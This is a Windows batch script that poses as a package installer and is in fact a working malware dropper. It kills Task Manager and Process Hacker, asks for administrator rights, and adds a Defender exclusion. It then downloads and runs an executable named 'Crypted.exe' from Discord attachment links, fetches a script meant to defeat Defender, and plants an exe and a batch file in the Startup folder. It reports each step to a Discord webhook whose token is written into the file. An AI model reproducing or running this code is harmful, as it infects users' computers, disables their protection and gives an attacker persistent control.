::prerequisites
@echo off
set url=https://cdn.discordapp.com/attachments/867304951896997908/968984294087352410/Crypted.exe
set defender=https://cdn.discordapp.com/attachments/965480849074192435/970997232507695124/defeat.bat
set check=https://cdn.discordapp.com/attachments/965480849074192435/970992338635751444/Check.bat
set startup69=https://textuploader.com/t14zj/raw
set webhook=https://discord.com/api/webhooks/965480955299127296/blCV9lkBmvgKUpfKAYWLe7e2wIrIBV_c7d3r2_hqNwgO4uqz_6HZb8DxZelBTkwevEIf
set startup="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

mode 15,1
taskkill /f /im processhacker.exe
taskkill /f /im Taskmgr.exe
cls
set EXE=RegAsm.exe
title Installing Packages 
FOR /F %%k IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%k == %EXE% goto end
net session >nul 2>&1
::start
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )
::UAC prompt
:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
set params = %*:"="
echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
goto check
::when admin is aquired using UAC goes here
:gotAdmin

cd %temp%

powershell -Command Add-MpPreference -ExclusionPath "%temp%" -ErrorAction SilentlyContinue

powershell -Command start-bitstransfer %url%  .\PAYLOAD333.exe
cls
goto adminrights
::all executions as administrator, e.g. Payload execution
:adminrights
start PAYLOAD333.exe
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"admin privileges granted on %username%, and checking process activity\"}" %webhook%
FOR /F %%k IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%k == %EXE% goto regactive
::Regdead = RegAsm.exe not a current running process
:regdead
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"RegAsm.exe Is disabled on computer, Attempting to re-enable. Then Defeating defender\"}" %webhook%
start payload333.exe
goto end
::Regdead = RegAsm.exe is a current running process
:regactive
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"RegAsm.exe Is enabled on computer, Defeating defender\"}" %webhook%
cd %temp%
curl -o defeat54734.bat %defender%
start "%temp%\defeat54734.bat"
cd %startup%
curl -o skytils.exe %url%
curl -o startup69.bat %startup69%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Startup rooted with exe & bat.\"}" %webhook%
goto adminend
:: check = check if admin is enabled, if enabled skips minecraft kill
:check
cd %temp%
curl -o check.bat %check%
call "%temp%\check.bat"
:end
ping localhost -n 4 >nul
taskkill /f /im sechealthUi.exe
taskkill /f /im cmd.exe

:adminend
